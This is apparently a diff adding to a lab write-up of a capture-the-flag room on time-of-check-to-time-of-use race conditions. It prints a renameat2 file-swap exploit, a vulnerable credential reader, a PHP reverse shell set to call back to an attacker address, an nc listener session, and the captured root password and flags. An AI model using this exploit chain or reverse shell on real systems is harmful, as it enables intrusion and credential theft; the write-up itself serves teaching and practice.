@@ -199,3 +199,205 @@ Time-of-Check to Time-of-Use (TOCTTOU) is a type of race condition vulnerability
 #include <sys/syscall.h>
 #include <linux/fs.h>
 
+int main(int argc, char *argv[]) {
+  while (1) {
+    syscall(SYS_renameat2, AT_FDCWD, argv[1], AT_FDCWD, argv[2], RENAME_EXCHANGE);
+  }
+  return 0;
+}
+
+1. The `while(1)` loop continuously invokes the `SYS_renameat2` system call, checking and using the files/directories for renaming.
+    
+2. At the time of the `SYS_renameat2` system call, the code checks the state of the specified source and destination files/directories.
+    
+3. However, between the time of checking (in `syscall`) and using the files (in the `SYS_renameat2` system call), the state of the files/directories might change due to other processes or external factors.
+    
+4. This race condition may lead to unexpected behavior, as the source and destination files/directories might no longer be in the expected state when the `SYS_renameat2` system call is executed.
+    
+5. The program does not handle any synchronization or locking mechanisms to prevent this race condition.
+    
+
+In real-world scenarios, TOCTTOU vulnerabilities can lead to security issues where an attacker can manipulate the state of the resource during the time gap between checking and using it, potentially leading to data corruption, privilege escalation, or other security breaches.
+
+┌──(root㉿kali)-[/home/witty/Downloads]
+└─# git clone https://github.com/sroettger/35c3ctf_chals.git     
+Cloning into '35c3ctf_chals'...
+remote: Enumerating objects: 4541, done.
+remote: Total 4541 (delta 0), reused 0 (delta 0), pack-reused 4541
+Receiving objects: 100% (4541/4541), 45.25 MiB | 2.78 MiB/s, done.
+Resolving deltas: 100% (957/957), done.
+Updating files: 100% (4261/4261), done.
+                                                                                       
+┌──(root㉿kali)-[/home/witty/Downloads]
+└─# cd 35c3ctf_chals/logrotate/exploit 
+                                                                                       
+┌──(root㉿kali)-[/home/…/Downloads/35c3ctf_chals/logrotate/exploit]
+└─# ls
+doit.sh  rename  rename.c
+                                                                                       
+┌──(root㉿kali)-[/home/…/Downloads/35c3ctf_chals/logrotate/exploit]
+└─# cat rename.c 
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <fcntl.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <sys/syscall.h>
+#include <linux/fs.h>
+
+int main(int argc, char *argv[]) {
+  while (1) {
+    syscall(SYS_renameat2, AT_FDCWD, argv[1], AT_FDCWD, argv[2], RENAME_EXCHANGE);
+  }
+  return 0;
+}
+
+frank@toc:~$ wget 10.8.19.103/rename.c
+wget 10.8.19.103/rename.c
+--  http://10.8.19.103/rename.c
+Connecting to 10.8.19.103:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 295 [text/x-csrc]
+Saving to: ‘rename.c’
+
+rename.c              0%[                    ]       0  --.-KB/s              rename.c            100%[===================>]     295  --.-KB/s    in 0s      
+
+(29.1 MB/s) - ‘rename.c’ saved [295/295]
+
+┌──(root㉿kali)-[/home/…/Downloads/35c3ctf_chals/logrotate/exploit]
+└─# python3 -m http.server 80                                                        
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.9.45 - - [29/Jul/2023 20:02:22] "GET /rename.c HTTP/1.1" 200 -
+
+frank@toc:~$ mv rename.c root_access
+mv rename.c root_access
+frank@toc:~$ cd root_access
+cd root_access
+frank@toc:~/root_access$ ls
+ls
+readcreds  readcreds.c  rename.c  root_password_backup
+
+frank@toc:~/root_access$ cat readcreds.c
+cat readcreds.c
+#include <string.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <fcntl.h>
+#include <errno.h>
+#include <stdlib.h>
+
+int main(int argc, char* argv[]) {
+    int file_data; char buffer[256]; int size = 0;
+
+    if(argc != 2) {
+        printf("Binary to output the contents of credentials file \n ./readcreds [file] \n"); 
+	exit(1);
+    }
+
+    if (!access(argv[1],R_OK)) {
+	    sleep(1);
+	    file_data = open(argv[1], O_RDONLY);
+    } else {
+	    fprintf(stderr, "Cannot open %s \n", argv[1]);
+	    exit(1);
+    }
+
+    do {
+        size = read(file_data, buffer, 256);
+        write(1, buffer, size);
+    } 
+    
+    while(size>0);
+
+}
+
+Providing the `root_password_backup` file to the `readcreds` binary will show an error, as the file is owned by `root`
+
+frank@toc:~/root_access$ ./readcreds 
+./readcreds 
+Binary to output the contents of credentials file 
+ ./readcreds [file] 
+frank@toc:~/root_access$ ./readcreds root_password_backup
+./readcreds root_password_backup
+Cannot open root_password_backup 
+
+frank@toc:~/root_access$ touch race
+touch race
+frank@toc:~/root_access$ gcc rename.c -o rename
+gcc rename.c -o rename
+frank@toc:~/root_access$ ./rename race root_password_backup
+./rename race root_password_backup
+
+now in another session
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ head payload_monkey.php
+<?php
+// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
+// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
+
+set_time_limit (0);
+$VERSION = "1.0";
+$ip = '10.8.19.103';
+$port = 4444;
+$chunk_size = 1400;
+$write_a = null;
+
+same upload it go to Content/File Manager
+
+http://10.10.9.45/cmsms/uploads/payload_monkey.php
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ rlwrap nc -lvnp 4444                   
+listening on [any] 4444 ...
+connect to [10.8.19.103] from (UNKNOWN) [10.10.9.45] 45068
+Linux toc 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+ 00:15:50 up  1:08,  0 users,  load average: 5.30, 4.22, 3.17
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+sh: 0: can't access tty; job control turned off
+```
+
+## Privilege Escalation
+```text
+$ python3 -c "import pty; pty.spawn('/bin/bash')" || python -c "import pty; pty.spawn('/bin/bash')" || /usr/bin/script -qc /bin/bash /dev/null
+www-data@toc:/$ cd /home/frank/root_access
+cd /home/frank/root_access
+www-data@toc:/home/frank/root_access$ ls
+ls
+race  readcreds  readcreds.c  rename  rename.c	root_password_backup
+www-data@toc:/home/frank/root_access$ ./readcreds root_password_backup
+./readcreds root_password_backup
+Root Credentials:  root:aloevera 
+
+root@toc:/home/frank/root_access# cd /root
+cd /root
+root@toc:~# ls
+ls
+root.txt
+root@toc:~# cat root.txt
+cat root.txt
+thm{7265616c6c696665}
+```
+![[Pasted image 20230729183025.png]]
+Find and retrieve the user.txt flag
+Escalate your privileges and acquire root.txt
+https://github.com/sroettger/35c3ctf_chals/blob/master/logrotate/exploit/rename.c
+### Task 3  Further Exploration
+**LiveOverflow** has an amazing video exploring this kind of vulnerability, as well as how to remediate it which you can find here. I thoroughly recommend checking it out if you're having trouble visualising how this kind of race condition works and how to properly exploit it:
+[https://www.youtube.com/watch?v=5g137gsB9Wk](https://www.youtube.com/watch?v=5g137gsB9Wk)[](https://www.youtube.com/watch?v=5g137gsB9Wk)
+The **Wikipedia** entry for this kind of vulnerability is also extremely useful, and provides similar examples in C of how this vulnerability can occur and be exploited for leveraging privileges.
+Have a great day, stay safe.
+~  Polo
+Answer the questions below
+I now understand where to find more information on this kind of vulnerability.
+Completed
+
+## Flags / Answers
+- ***thm{63616d70657276616e206c696665}***
+- ***thm{7265616c6c696665}***
+
+## Notes / Lessons Learned
+[[TwoMillion]]
+
